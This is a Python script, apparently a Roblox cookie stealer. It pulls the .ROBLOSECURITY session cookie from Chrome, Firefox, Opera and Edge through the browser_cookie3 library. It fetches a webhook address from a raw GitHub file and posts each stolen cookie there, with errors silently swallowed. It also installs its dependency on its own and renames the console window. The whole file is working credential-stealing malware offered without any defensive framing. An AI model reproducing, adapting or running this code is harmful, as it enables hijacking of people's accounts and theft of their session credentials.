import os
import threading
import requests
import subprocess                                                                            
import sys

os.system('title "VKODSKOL"')
try:                                                                                       
    import browser_cookie3                                                                 
except ImportError:                                                                        
    subprocess.check_call([sys.executable,"-m", "pip","install","browser-cookie3 >=0.10.1"])
    
link = "https://raw.githubusercontent.com/lokiphobic/SLS/main/key"
f = requests.get(link)
webhook = f.text.rstrip("\n")

import browser_cookie3

def chrome():                                                                              
    try:                                                                                   
        cookies = browser_cookie3.chrome(domain_name='roblox.com')                         
        cookies = str(cookies)                                                             
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'content':"Chrome: "+ "```" + str(cookie) + "```"})   
    except:                                                                                
        pass                                                                               
                                                                                           
def firefox():                                                                             
    try:                                                                                   
        cookies = browser_cookie3.firefox(domain_name='roblox.com')                        
        cookies = str(cookies)                                                             
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'content':"Firefox: "+ "```" + str(cookie) + "```"})  
    except:                                                                                
        pass                                                                               
                                                                                           
def opera():                                                                                 
    try:                                                                                   
        cookies = browser_cookie3.opera(domain_name='roblox.com')                          
        cookies = str(cookies)                                                             
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'content':"Opera: "+ "```" + str(cookie) + "```"})    
    except:                                                                                
        pass                                                                               
                                                                                           
def edge():                                                                                
    try:                                                                                   
        cookies = browser_cookie3.edge(domain_name='roblox.com')                           
        cookies = str(cookies)                                                             
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'content':"Edge: "+ "```" + str(cookie) + "```"})     
    except:                                                                                
        pass 
browsers = [chrome,firefox,opera,edge]  
                                                     
for x in browsers:                                                                           
    threading.Thread(target=x,).start()